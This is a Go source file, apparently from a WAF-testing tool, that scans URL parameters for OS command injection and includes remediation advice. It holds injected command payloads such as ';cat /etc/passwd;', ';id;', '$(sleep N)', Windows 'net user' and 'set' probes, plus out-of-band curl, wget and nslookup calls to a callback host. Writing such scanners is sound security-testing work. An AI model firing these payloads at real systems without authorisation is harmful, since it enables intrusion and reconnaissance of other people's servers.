// Package cmdi provides command injection vulnerability detection.
// It supports OS command injection detection with time-based, error-based,
// and output-based detection techniques across multiple platforms.
package cmdi

import (
	"context"
	"fmt"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"time"

	"github.com/waftester/waftester/pkg/defaults"
	"github.com/waftester/waftester/pkg/duration"
	"github.com/waftester/waftester/pkg/httpclient"
	"github.com/waftester/waftester/pkg/iohelper"
)

// InjectionType represents different command injection types
type InjectionType string

const (
	InjectionTimeBased   InjectionType = "time_based"   // Sleep/delay-based detection
	InjectionErrorBased  InjectionType = "error_based"  // Error message detection
	InjectionOutputBased InjectionType = "output_based" // Command output detection
	InjectionBlind       InjectionType = "blind"        // Out-of-band detection
	InjectionStacked     InjectionType = "stacked"      // Stacked command execution
)

// Platform represents the target platform
type Platform string

const (
	PlatformUnix    Platform = "unix"
	PlatformWindows Platform = "windows"
	PlatformBoth    Platform = "both"
)

// Severity represents the severity of a finding
type Severity string

const (
	SeverityCritical Severity = "critical"
	SeverityHigh     Severity = "high"
	SeverityMedium   Severity = "medium"
	SeverityLow      Severity = "low"
	SeverityInfo     Severity = "info"
)

// Payload represents a command injection payload
type Payload struct {
	Name          string         // Payload name
	Type          InjectionType  // Injection type
	Platform      Platform       // Target platform
	Value         string         // The payload value
	Description   string         // Description
	Indicators    []string       // Strings to look for in response
	Regex         *regexp.Regexp // Regex pattern to match
	ExpectedDelay time.Duration  // Expected delay for time-based
}

// Vulnerability represents a detected command injection vulnerability
type Vulnerability struct {
	Type         InjectionType `json:"type"`
	Description  string        `json:"description"`
	Severity     Severity      `json:"severity"`
	Payload      *Payload      `json:"payload"`
	Parameter    string        `json:"parameter"`
	Evidence     string        `json:"evidence"`
	URL          string        `json:"url"`
	Platform     Platform      `json:"platform"`
	ResponseTime time.Duration `json:"response_time"`
	Remediation  string        `json:"remediation"`
}

// TesterConfig configures the command injection tester
type TesterConfig struct {
	Timeout       time.Duration
	UserAgent     string
	Headers       http.Header
	Cookies       []*http.Cookie
	Platform      Platform      // Target platform (unix, windows, both)
	TimeThreshold time.Duration // Threshold for time-based detection
	CallbackURL   string        // For out-of-band detection
}

// DefaultConfig returns a default tester configuration
func DefaultConfig() *TesterConfig {
	return &TesterConfig{
		Timeout:       duration.HTTPFuzzing,
		UserAgent:     defaults.UAChrome,
		Platform:      PlatformBoth,
		TimeThreshold: duration.CMDIThreshold,
	}
}

// Tester performs command injection testing
type Tester struct {
	config   *TesterConfig
	client   *http.Client
	payloads []*Payload
}

// NewTester creates a new command injection tester
func NewTester(config *TesterConfig) *Tester {
	if config == nil {
		config = DefaultConfig()
	}

	t := &Tester{
		config: config,
		client: httpclient.Fuzzing(),
	}

	t.payloads = t.generatePayloads()

	return t
}

func (t *Tester) generatePayloads() []*Payload {
	var payloads []*Payload

	// Time-based payloads (Unix)
	if t.config.Platform == PlatformUnix || t.config.Platform == PlatformBoth {
		payloads = append(payloads, t.unixTimePayloads()...)
		payloads = append(payloads, t.unixOutputPayloads()...)
		payloads = append(payloads, t.unixErrorPayloads()...)
	}

	// Time-based payloads (Windows)
	if t.config.Platform == PlatformWindows || t.config.Platform == PlatformBoth {
		payloads = append(payloads, t.windowsTimePayloads()...)
		payloads = append(payloads, t.windowsOutputPayloads()...)
	}

	// Blind/OOB payloads
	if t.config.CallbackURL != "" {
		payloads = append(payloads, t.oobPayloads()...)
	}

	return payloads
}

func (t *Tester) unixTimePayloads() []*Payload {
	delay := int(t.config.TimeThreshold.Seconds())

	return []*Payload{
		// Command separators
		{Name: "Unix Sleep Semicolon", Type: InjectionTimeBased, Platform: PlatformUnix,
			Value: fmt.Sprintf(";sleep %d;", delay), ExpectedDelay: t.config.TimeThreshold,
			Description: "Command injection using semicolon separator"},
		{Name: "Unix Sleep Pipe", Type: InjectionTimeBased, Platform: PlatformUnix,
			Value: fmt.Sprintf("|sleep %d|", delay), ExpectedDelay: t.config.TimeThreshold,
			Description: "Command injection using pipe separator"},
		{Name: "Unix Sleep AND", Type: InjectionTimeBased, Platform: PlatformUnix,
			Value: fmt.Sprintf("&&sleep %d&&", delay), ExpectedDelay: t.config.TimeThreshold,
			Description: "Command injection using AND operator"},
		{Name: "Unix Sleep OR", Type: InjectionTimeBased, Platform: PlatformUnix,
			Value: fmt.Sprintf("||sleep %d||", delay), ExpectedDelay: t.config.TimeThreshold,
			Description: "Command injection using OR operator"},
		{Name: "Unix Sleep Backtick", Type: InjectionTimeBased, Platform: PlatformUnix,
			Value: fmt.Sprintf("`sleep %d`", delay), ExpectedDelay: t.config.TimeThreshold,
			Description: "Command injection using backtick substitution"},
		{Name: "Unix Sleep Subshell", Type: InjectionTimeBased, Platform: PlatformUnix,
			Value: fmt.Sprintf("$(sleep %d)", delay), ExpectedDelay: t.config.TimeThreshold,
			Description: "Command injection using subshell"},
		{Name: "Unix Sleep Newline", Type: InjectionTimeBased, Platform: PlatformUnix,
			Value: fmt.Sprintf("\nsleep %d\n", delay), ExpectedDelay: t.config.TimeThreshold,
			Description: "Command injection using newline"},
		{Name: "Unix Sleep URL Newline", Type: InjectionTimeBased, Platform: PlatformUnix,
			Value: fmt.Sprintf("%%0asleep %d%%0a", delay), ExpectedDelay: t.config.TimeThreshold,
			Description: "Command injection using URL-encoded newline"},
	}
}

func (t *Tester) unixOutputPayloads() []*Payload {
	return []*Payload{
		{Name: "Unix id", Type: InjectionOutputBased, Platform: PlatformUnix,
			Value: ";id;", Indicators: []string{"uid=", "gid=", "groups="},
			Description: "Unix id command execution"},
		{Name: "Unix whoami", Type: InjectionOutputBased, Platform: PlatformUnix,
			Value: ";whoami;", Indicators: []string{"root", "www-data", "nobody", "apache", "nginx"},
			Description: "Unix whoami command execution"},
		{Name: "Unix pwd", Type: InjectionOutputBased, Platform: PlatformUnix,
			Value: ";pwd;", Regex: regexp.MustCompile(`^/[a-zA-Z0-9/_-]+$`),
			Description: "Unix pwd command execution"},
		{Name: "Unix uname", Type: InjectionOutputBased, Platform: PlatformUnix,
			Value: ";uname -a;", Indicators: []string{"Linux", "Darwin", "Unix", "BSD"},
			Description: "Unix uname command execution"},
		{Name: "Unix cat passwd", Type: InjectionOutputBased, Platform: PlatformUnix,
			Value: ";cat /etc/passwd;", Indicators: []string{"root:", "nobody:", "/bin/bash", "/bin/sh"},
			Description: "Unix file read via cat"},
		{Name: "Unix ls", Type: InjectionOutputBased, Platform: PlatformUnix,
			Value: ";ls -la;", Indicators: []string{"total", "drwx", "-rw"},
			Description: "Unix directory listing"},

		// With different separators
		{Name: "Unix id pipe", Type: InjectionOutputBased, Platform: PlatformUnix,
			Value: "|id|", Indicators: []string{"uid=", "gid="},
			Description: "Pipe-based id execution"},
		{Name: "Unix id backtick", Type: InjectionOutputBased, Platform: PlatformUnix,
			Value: "`id`", Indicators: []string{"uid=", "gid="},
			Description: "Backtick-based id execution"},
		{Name: "Unix id subshell", Type: InjectionOutputBased, Platform: PlatformUnix,
			Value: "$(id)", Indicators: []string{"uid=", "gid="},
			Description: "Subshell-based id execution"},
	}
}

func (t *Tester) unixErrorPayloads() []*Payload {
	return []*Payload{
		{Name: "Unix Invalid Command", Type: InjectionErrorBased, Platform: PlatformUnix,
			Value:       ";invalidcmd12345;",
			Indicators:  []string{"not found", "command not found", "No such file"},
			Description: "Invalid command error detection"},
		{Name: "Unix Syntax Error", Type: InjectionErrorBased, Platform: PlatformUnix,
			Value:       ";'\"",
			Indicators:  []string{"syntax error", "unexpected", "unmatched"},
			Description: "Shell syntax error detection"},
	}
}

func (t *Tester) windowsTimePayloads() []*Payload {
	delay := int(t.config.TimeThreshold.Seconds())

	return []*Payload{
		{Name: "Windows Ping Delay", Type: InjectionTimeBased, Platform: PlatformWindows,
			Value: fmt.Sprintf("&ping -n %d 127.0.0.1&", delay+1), ExpectedDelay: t.config.TimeThreshold,
			Description: "Windows ping delay"},
		{Name: "Windows Timeout", Type: InjectionTimeBased, Platform: PlatformWindows,
			Value: fmt.Sprintf("&timeout /t %d&", delay), ExpectedDelay: t.config.TimeThreshold,
			Description: "Windows timeout delay"},
		{Name: "Windows Ping AND", Type: InjectionTimeBased, Platform: PlatformWindows,
			Value: fmt.Sprintf("&&ping -n %d 127.0.0.1&&", delay+1), ExpectedDelay: t.config.TimeThreshold,
			Description: "Windows AND operator ping"},
		{Name: "Windows Ping OR", Type: InjectionTimeBased, Platform: PlatformWindows,
			Value: fmt.Sprintf("||ping -n %d 127.0.0.1||", delay+1), ExpectedDelay: t.config.TimeThreshold,
			Description: "Windows OR operator ping"},
		{Name: "Windows Pipe Ping", Type: InjectionTimeBased, Platform: PlatformWindows,
			Value: fmt.Sprintf("|ping -n %d 127.0.0.1", delay+1), ExpectedDelay: t.config.TimeThreshold,
			Description: "Windows pipe separator ping"},
	}
}

func (t *Tester) windowsOutputPayloads() []*Payload {
	return []*Payload{
		{Name: "Windows whoami", Type: InjectionOutputBased, Platform: PlatformWindows,
			Value: "&whoami&", Indicators: []string{"\\", "administrator", "system"},
			Description: "Windows whoami execution"},
		{Name: "Windows hostname", Type: InjectionOutputBased, Platform: PlatformWindows,
			Value: "&hostname&", Description: "Windows hostname execution"},
		{Name: "Windows dir", Type: InjectionOutputBased, Platform: PlatformWindows,
			Value: "&dir&", Indicators: []string{"Volume", "Directory", "<DIR>"},
			Description: "Windows directory listing"},
		{Name: "Windows type", Type: InjectionOutputBased, Platform: PlatformWindows,
			Value: "&type C:\\Windows\\win.ini&", Indicators: []string{"[extensions]", "[fonts]"},
			Description: "Windows file read via type"},
		{Name: "Windows ver", Type: InjectionOutputBased, Platform: PlatformWindows,
			Value: "&ver&", Indicators: []string{"Microsoft Windows", "Version"},
			Description: "Windows version"},
		{Name: "Windows set", Type: InjectionOutputBased, Platform: PlatformWindows,
			Value: "&set&", Indicators: []string{"PATH=", "COMSPEC=", "SystemRoot="},
			Description: "Windows environment variables"},
		{Name: "Windows ipconfig", Type: InjectionOutputBased, Platform: PlatformWindows,
			Value: "&ipconfig&", Indicators: []string{"IPv4", "Subnet Mask", "Default Gateway"},
			Description: "Windows network configuration"},
		{Name: "Windows systeminfo", Type: InjectionOutputBased, Platform: PlatformWindows,
			Value: "&systeminfo&", Indicators: []string{"OS Name", "OS Version", "System Type"},
			Description: "Windows system information"},
		{Name: "Windows net user", Type: InjectionOutputBased, Platform: PlatformWindows,
			Value: "&net user&", Indicators: []string{"Administrator", "Guest"},
			Description: "Windows user listing"},
		{Name: "Windows echo pipe", Type: InjectionOutputBased, Platform: PlatformWindows,
			Value: "|echo waftester_cmdi|", Indicators: []string{"waftester_cmdi"},
			Description: "Windows pipe separator echo"},
		{Name: "Windows tasklist", Type: InjectionOutputBased, Platform: PlatformWindows,
			Value: "&tasklist&", Indicators: []string{"PID", "Session", "Mem Usage"},
			Description: "Windows process listing"},
	}
}

func (t *Tester) oobPayloads() []*Payload {
	callback := t.config.CallbackURL

	return []*Payload{
		{Name: "Unix OOB curl", Type: InjectionBlind, Platform: PlatformUnix,
			Value:       fmt.Sprintf(";curl %s/cmdi;", callback),
			Description: "Out-of-band via curl"},
		{Name: "Unix OOB wget", Type: InjectionBlind, Platform: PlatformUnix,
			Value:       fmt.Sprintf(";wget %s/cmdi;", callback),
			Description: "Out-of-band via wget"},
		{Name: "Unix OOB nslookup", Type: InjectionBlind, Platform: PlatformUnix,
			Value:       fmt.Sprintf(";nslookup cmdi.%s;", strings.TrimPrefix(strings.TrimPrefix(callback, "https://"), "http://")),
			Description: "Out-of-band via DNS"},
		{Name: "Windows OOB ping", Type: InjectionBlind, Platform: PlatformWindows,
			Value:       fmt.Sprintf("&ping %s&", strings.TrimPrefix(strings.TrimPrefix(callback, "https://"), "http://")),
			Description: "Out-of-band via ping"},
		{Name: "Windows OOB nslookup", Type: InjectionBlind, Platform: PlatformWindows,
			Value:       fmt.Sprintf("&nslookup cmdi.%s&", strings.TrimPrefix(strings.TrimPrefix(callback, "https://"), "http://")),
			Description: "Out-of-band via DNS"},
	}
}

// GetPayloads returns all payloads, optionally filtered by type
func (t *Tester) GetPayloads(injType InjectionType) []*Payload {
	if injType == "" {
		return t.payloads
	}

	var filtered []*Payload
	for _, p := range t.payloads {
		if p.Type == injType {
			filtered = append(filtered, p)
		}
	}
	return filtered
}

// TestParameter tests a specific parameter for command injection
func (t *Tester) TestParameter(ctx context.Context, targetURL string, param string, method string) ([]*Vulnerability, error) {
	var vulns []*Vulnerability

	// Get baseline response time
	baseline, err := t.getBaselineTime(ctx, targetURL, method)
	if err != nil {
		baseline = 500 * time.Millisecond
	}

	for _, payload := range t.payloads {
		select {
		case <-ctx.Done():
			return vulns, ctx.Err()
		default:
		}

		vuln, err := t.testPayload(ctx, targetURL, param, method, payload, baseline)
		if err != nil {
			continue
		}
		if vuln != nil {
			vulns = append(vulns, vuln)
		}
	}

	return vulns, nil
}

func (t *Tester) getBaselineTime(ctx context.Context, targetURL string, method string) (time.Duration, error) {
	req, err := http.NewRequestWithContext(ctx, method, targetURL, nil)
	if err != nil {
		return 0, err
	}

	req.Header.Set("User-Agent", t.config.UserAgent)

	start := time.Now()
	resp, err := t.client.Do(req)
	if err != nil {
		return 0, err
	}
	defer iohelper.DrainAndClose(resp.Body)

	return time.Since(start), nil
}

func (t *Tester) testPayload(ctx context.Context, targetURL, param, method string, payload *Payload, baseline time.Duration) (*Vulnerability, error) {
	// Build test URL
	testURL, err := url.Parse(targetURL)
	if err != nil {
		return nil, err
	}

	q := testURL.Query()
	q.Set(param, payload.Value)
	testURL.RawQuery = q.Encode()

	req, err := http.NewRequestWithContext(ctx, method, testURL.String(), nil)
	if err != nil {
		return nil, err
	}

	req.Header.Set("User-Agent", t.config.UserAgent)
	for key, values := range t.config.Headers {
		for _, v := range values {
			req.Header.Add(key, v)
		}
	}

	start := time.Now()
	resp, err := t.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer iohelper.DrainAndClose(resp.Body)
	elapsed := time.Since(start)

	body, _ := iohelper.ReadBodyDefault(resp.Body)
	bodyStr := string(body)

	return t.analyzeResponse(testURL.String(), param, payload, bodyStr, elapsed, baseline)
}

func (t *Tester) analyzeResponse(testURL, param string, payload *Payload, body string, elapsed, baseline time.Duration) (*Vulnerability, error) {
	var evidence string
	var detected bool

	switch payload.Type {
	case InjectionTimeBased:
		// Check if response time indicates delay
		expectedDelay := payload.ExpectedDelay
		if elapsed > baseline+expectedDelay-duration.CMDITolerance {
			evidence = fmt.Sprintf("Response delayed by %v (baseline: %v, expected: %v)", elapsed, baseline, expectedDelay)
			detected = true
		}

	case InjectionOutputBased:
		// Check for indicator strings
		for _, indicator := range payload.Indicators {
			if strings.Contains(body, indicator) {
				evidence = fmt.Sprintf("Output contains: %s", indicator)
				detected = true
				break
			}
		}

		// Check regex pattern
		if payload.Regex != nil && !detected {
			if payload.Regex.MatchString(body) {
				evidence = "Output matches expected pattern"
				detected = true
			}
		}

	case InjectionErrorBased:
		// Check for error indicators
		for _, indicator := range payload.Indicators {
			if strings.Contains(strings.ToLower(body), strings.ToLower(indicator)) {
				evidence = fmt.Sprintf("Error message: %s", indicator)
				detected = true
				break
			}
		}
	}

	if !detected {
		return nil, nil
	}

	return &Vulnerability{
		Type:         payload.Type,
		Description:  payload.Description,
		Severity:     SeverityCritical,
		Payload:      payload,
		Parameter:    param,
		Evidence:     evidence,
		URL:          testURL,
		Platform:     payload.Platform,
		ResponseTime: elapsed,
		Remediation:  "Never pass user input to system commands. Use parameterized APIs, input validation, and allowlists.",
	}, nil
}

// Result represents a command injection scan result
type Result struct {
	URL             string           `json:"url"`
	Vulnerabilities []*Vulnerability `json:"vulnerabilities"`
	TestedParams    int              `json:"tested_params"`
	PayloadsTested  int              `json:"payloads_tested"`
	Duration        time.Duration    `json:"duration"`
}

// CommonInjectionParams returns common parameter names used in command contexts
func CommonInjectionParams() []string {
	return []string{
		"cmd", "command", "exec", "execute", "run",
		"ping", "query", "search", "file", "filename",
		"path", "dir", "folder", "host", "ip",
		"port", "target", "domain", "url", "input",
		"name", "arg", "args", "param", "params",
		"option", "options", "debug", "test", "action",
	}
}

// Scan performs a comprehensive command injection scan
func (t *Tester) Scan(ctx context.Context, targetURL string) (*Result, error) {
	start := time.Now()

	result := &Result{
		URL:            targetURL,
		PayloadsTested: len(t.payloads),
	}

	params := CommonInjectionParams()
	result.TestedParams = len(params)

	var allVulns []*Vulnerability

	for _, param := range params {
		select {
		case <-ctx.Done():
			return result, ctx.Err()
		default:
		}

		vulns, err := t.TestParameter(ctx, targetURL, param, "GET")
		if err != nil {
			continue
		}

		allVulns = append(allVulns, vulns...)
	}

	result.Vulnerabilities = allVulns
	result.Duration = time.Since(start)

	return result, nil
}

// AllInjectionTypes returns all command injection types
func AllInjectionTypes() []InjectionType {
	return []InjectionType{
		InjectionTimeBased,
		InjectionErrorBased,
		InjectionOutputBased,
		InjectionBlind,
		InjectionStacked,
	}
}

// GetRemediation returns remediation advice
func GetRemediation() string {
	return `Command Injection Prevention:
1. Avoid system commands when possible - use native libraries
2. Input validation with strict allowlists
3. Use parameterized APIs that don't invoke shell
4. Escape special characters if shell is unavoidable
5. Run with minimal privileges
6. Use sandboxing/containerization`
}
